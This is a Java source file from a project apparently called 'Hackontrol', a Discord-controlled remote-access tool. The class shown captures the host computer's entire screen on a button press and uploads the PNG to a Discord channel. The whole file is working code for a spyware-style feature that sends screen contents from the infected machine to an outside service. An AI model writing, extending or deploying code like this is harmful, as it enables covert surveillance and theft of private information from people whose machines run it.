package com.khopan.hackontrol.channel;

import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.util.Calendar;

import javax.imageio.ImageIO;

import com.khopan.hackontrol.Hackontrol;
import com.khopan.hackontrol.HackontrolChannel;
import com.khopan.hackontrol.button.ButtonHandlerRegistry;
import com.khopan.hackontrol.button.ButtonInteraction;
import com.khopan.hackontrol.utils.ErrorUtils;

import net.dv8tion.jda.api.interactions.components.ActionRow;
import net.dv8tion.jda.api.interactions.components.buttons.Button;
import net.dv8tion.jda.api.utils.FileUpload;

public class ScreenshotChannel extends HackontrolChannel {
	private static final String CHANNEL_NAME = "screenshot";

	private static final String SCREENSHOT_BUTTON_IDENTIFIER = "takeScreenshot";

	private final Robot robot;

	private Throwable Errors;

	public ScreenshotChannel() {
		Robot robot;

		try {
			robot = new Robot();
		} catch(Throwable Errors) {
			robot = null;
			this.Errors = Errors;
		}

		this.robot = robot;
	}

	@Override
	public String getChannelName() {
		return ScreenshotChannel.CHANNEL_NAME;
	}

	@Override
	public void sendInitializeMessage() {
		this.channel.sendMessageComponents(ActionRow.of(Button.success(ScreenshotChannel.SCREENSHOT_BUTTON_IDENTIFIER, "Screenshot"))).queue();
	}

	@Override
	public void registerButtonHandler(ButtonHandlerRegistry registry) {
		registry.register(ScreenshotChannel.SCREENSHOT_BUTTON_IDENTIFIER, this :: screenshot);
	}

	private void screenshot(ButtonInteraction interaction) {
		if(this.robot == null) {
			ErrorUtils.sendErrorReply(interaction, this.Errors);
			return;
		}

		Dimension size = Toolkit.getDefaultToolkit().getScreenSize();
		BufferedImage image = this.robot.createScreenCapture(new Rectangle(size));
		ByteArrayOutputStream stream = new ByteArrayOutputStream();

		try {
			ImageIO.write(image, "png", stream);
		} catch(Throwable Errors) {
			ErrorUtils.sendErrorReply(interaction, Errors);
			return;
		}

		byte[] byteArray = stream.toByteArray();
		interaction.getEvent().replyFiles(FileUpload.fromData(byteArray, ScreenshotChannel.getScreenshotFileName())).addActionRow(Button.success(ScreenshotChannel.SCREENSHOT_BUTTON_IDENTIFIER, "Screenshot"), Button.danger(Hackontrol.DELETE_SELF_IDENTIFIER, "Delete")).queue();
	}

	private static String getScreenshotFileName() {
		try {
			Calendar calendar = Calendar.getInstance();
			return String.format("screenshot-%04d_%02d_%02d-%02d_%02d_%02d_%03d.png",
					calendar.get(Calendar.YEAR),
					calendar.get(Calendar.MONTH) + 1,
					calendar.get(Calendar.DAY_OF_MONTH),
					calendar.get(Calendar.HOUR_OF_DAY),
					calendar.get(Calendar.MINUTE),
					calendar.get(Calendar.SECOND),
					calendar.get(Calendar.MILLISECOND)
					);
		} catch(Throwable Errors) {
			return "screenshot.png";
		}
	}
}
